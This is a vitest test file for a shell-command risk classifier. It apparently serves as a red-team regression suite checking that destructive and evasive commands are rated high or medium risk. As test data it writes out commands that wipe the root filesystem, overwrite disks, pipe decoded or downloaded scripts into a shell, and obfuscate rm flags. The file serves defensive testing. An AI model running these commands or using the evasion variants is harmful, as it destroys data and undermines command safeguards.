import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { isSkyportError } from '../errors/errors';
import {
  applyHint,
  assessRisk,
  defaultPolicyPath,
  loadPolicy,
  RISK_WEIGHT,
  tokenizeCommand,
  type RiskPolicy,
} from './risk';

let tempDir: string;

beforeEach(async () => {
  tempDir = await mkdtemp(join(tmpdir(), 'skyport-risk-'));
});

afterEach(async () => {
  await rm(tempDir, { recursive: true, force: true });
});

const noPolicy: RiskPolicy = { rules: [], whitelist: [], autoExecLowRisk: false };

function levelOf(command: string, policy: RiskPolicy = noPolicy): string {
  return assessRisk(command, policy).level;
}

/** 红队验收口径：变形命令至少 medium（删根路径必须 high） */
function atLeast(command: string, minimum: 'medium' | 'high'): void {
  const got = assessRisk(command, noPolicy).level;
  expect(RISK_WEIGHT[got], `${command} 判级 ${got}，应 ≥ ${minimum}`).toBeGreaterThanOrEqual(RISK_WEIGHT[minimum]);
}

describe('risk 红队回归考卷（S3/S4/S14——全部来自 QA 报告实测绕过样本）', () => {
  it('R1 分离旗标：rm -r -f / → high；rm -r -f /tmp/x → ≥medium', () => {
    expect(levelOf('rm -r -f /')).toBe('high');
    atLeast('rm -r -f /tmp/x', 'medium');
  });

  it('R2 引号包裹旗标：rm "-rf" /tmp/x → high；rm "-r" "-f" /tmp/x → ≥medium', () => {
    expect(levelOf('rm "-rf" /tmp/x')).toBe('high');
    atLeast('rm "-r" "-f" /tmp/x', 'medium');
  });

  it('R3 反斜杠转义：bash -c rm\\ -rf\\ / → high', () => {
    expect(levelOf('bash -c rm\\ -rf\\ /')).toBe('high');
  });

  it('R4 其他删除原语：find -delete / python rmtree / mv 根路径 → high', () => {
    expect(levelOf('find / -delete')).toBe('high');
    expect(levelOf("python3 -c \"import shutil; shutil.rmtree('/data')\"")).toBe('high');
    expect(levelOf('mv / /tmp/trash')).toBe('high');
  });

  it('R5 编码管道：任意程序管道进 shell → high（不再只盯 curl/wget）', () => {
    expect(levelOf('echo cm0gLXJmIC8= | base64 -d | sh')).toBe('high');
    expect(levelOf('cat x.gz | gunzip | bash')).toBe('high');
  });

  it('R6 变量间接：X=\'rm -rf /tmp/x\'; $X → ≥medium（赋值段内容扫描兜底）', () => {
    atLeast("X='rm -rf /tmp/x'; $X", 'medium');
  });

  it('R7 跳板（S4）：ssh t2 → ≥medium 且 pivots 携带 t2；解析不出目标 → high', () => {
    const assessment = assessRisk('ssh t2 "systemctl restart nginx"', noPolicy);
    expect(RISK_WEIGHT[assessment.level]).toBeGreaterThanOrEqual(RISK_WEIGHT.medium);
    expect(assessment.pivots).toContain('t2');
    expect(levelOf('ssh -o ProxyCommand=x')).toBe('high');
  });

  it('R8 执行原语：kubectl exec / docker exec / nsenter → high；解释器 -c/-e → ≥medium', () => {
    expect(levelOf('kubectl exec pod1 -- ls')).toBe('high');
    expect(levelOf('docker exec web ls')).toBe('high');
    expect(levelOf('nsenter -t 1 -m -- sh')).toBe('high');
    atLeast('node -e "console.log(1)"', 'medium');
  });

  it('R9 白名单加后缀（S14）：kubectl get pods; id 不吃白名单且无自动执行资格', () => {
    const policy: RiskPolicy = { rules: [], whitelist: ['kubectl get pods'], autoExecLowRisk: true };
    const assessment = assessRisk('kubectl get pods; id', policy);
    expect(assessment.source).not.toBe('policy-whitelist');
    expect(assessment.autoExecEligible).toBe(false);
  });
});

describe('risk 基线不回退（红队报告第二节通过项必须保持）', () => {
  it('危险命令仍 high：合并旗标/长选项/dd/mkfs/shutdown/sh -c 组合/curl|sh', () => {
    const commands = [
      'rm -rf /',
      'rm --recursive --force /',
      'dd if=/dev/zero of=/dev/sda',
      'mkfs.ext4 /dev/sda1',
      'shutdown now',
      'sh -c "rm -rf /"',
      'curl http://x.sh | sh',
      'rm -rf /tmp/x',
    ];
    for (const command of commands) expect(levelOf(command), command).toBe('high');
  });

  it('变更类仍 medium：systemctl / kubectl delete / chmod / service', () => {
    expect(levelOf('systemctl restart nginx')).toBe('medium');
    expect(levelOf('kubectl delete pod api-7f9')).toBe('medium');
    expect(levelOf('chmod 644 /tmp/x')).toBe('medium');
    expect(levelOf('service nginx stop')).toBe('medium');
  });

  it('红队 R 升级：truncate 设备路径 / chmod -R 000 / 判 high', () => {
    expect(levelOf('truncate -s 0 /dev/sda')).toBe('high');
    expect(levelOf('chmod -R 000 /')).toBe('high');
  });

  it('只读命令仍 low 且具备自动执行资格（单段）', () => {
    for (const command of ['kubectl get pods -n prod', 'ls -la', 'hostname', 'printf ok']) {
      const assessment = assessRisk(command, noPolicy);
      expect(assessment.level, command).toBe('low');
      expect(assessment.autoExecEligible).toBe(true);
    }
  });

  it('组合命令逐段取最大：hostname && uptime → low 但资格 false；uptime; reboot → high', () => {
    const compound = assessRisk('hostname && uptime', noPolicy);
    expect(compound.level).toBe('low');
    expect(compound.autoExecEligible).toBe(false);
    expect(levelOf('uptime; reboot')).toBe('high');
  });

  it('引号内的分隔符是字面量：echo "a;b" 单段 low', () => {
    const assessment = assessRisk('echo "a;b"', noPolicy);
    expect(assessment.segments).toHaveLength(1);
    expect(assessment.level).toBe('low');
  });

  it('命令替换地板：未加引号的 $() 与反引号 → ≥medium', () => {
    atLeast('echo $(whoami)', 'medium');
    atLeast('echo `whoami`', 'medium');
  });

  it('hint 只升不降', () => {
    const low = assessRisk('ls -la', noPolicy);
    expect(applyHint(low, 'high').level).toBe('high');
    const high = assessRisk('shutdown now', noPolicy);
    expect(applyHint(high, 'low').level).toBe('high');
  });

  it('策略规则可覆盖内置；白名单全等命中（含空白归一化，仅单段）', () => {
    const override: RiskPolicy = {
      rules: [{ pattern: 'systemctl restart nginx', level: 'high' }],
      whitelist: [],
      autoExecLowRisk: false,
    };
    expect(levelOf('systemctl restart nginx', override)).toBe('high');
    const whitelistPolicy: RiskPolicy = { rules: [], whitelist: ['kubectl   get pods'], autoExecLowRisk: false };
    const hit = assessRisk(' kubectl get  pods ', whitelistPolicy);
    expect(hit.source).toBe('policy-whitelist');
    expect(hit.level).toBe('low');
  });
});

describe('risk 策略文件加载（S2：只信数据目录或显式路径，不读 cwd）', () => {
  it('默认策略路径在 ~/.skyport/ 下', () => {
    expect(defaultPolicyPath()).toContain(join('.skyport', 'skyport.policy.json'));
  });

  it('缺失用默认；坏 JSON / 字段类型错 → CONFIG_INVALID（宁拒不猜）', async () => {
    const missing = join(tempDir, 'absent.policy.json');
    expect(loadPolicy(missing).autoExecLowRisk).toBe(false);

    const broken = join(tempDir, 'broken.policy.json');
    await writeFile(broken, '{oops', 'utf8');
    expect(capturePolicyError(() => loadPolicy(broken))).toBe('SKYPORT_CONFIG_INVALID');

    const wrongShape = join(tempDir, 'wrong.policy.json');
    await writeFile(wrongShape, JSON.stringify({ autoExecLowRisk: 'yes' }), 'utf8');
    expect(capturePolicyError(() => loadPolicy(wrongShape))).toBe('SKYPORT_CONFIG_INVALID');
  });
});

describe('tokenizeCommand（risk-parse 提供，经 risk 再导出）', () => {
  it('引号内空格保留、未闭合引号报错、空命令为空数组', () => {
    expect(tokenizeCommand('node -e "process.exit(0)" --flag')).toEqual(['node', '-e', 'process.exit(0)', '--flag']);
    expect(() => tokenizeCommand('echo "unclosed')).toThrowError();
    expect(tokenizeCommand('   ')).toEqual([]);
  });
});

function capturePolicyError(fn: () => unknown): string {
  try {
    fn();
  } catch (error) {
    if (isSkyportError(error)) return error.type;
    throw error;
  }
  throw new Error('期望策略加载抛错，但它正常返回了');
}
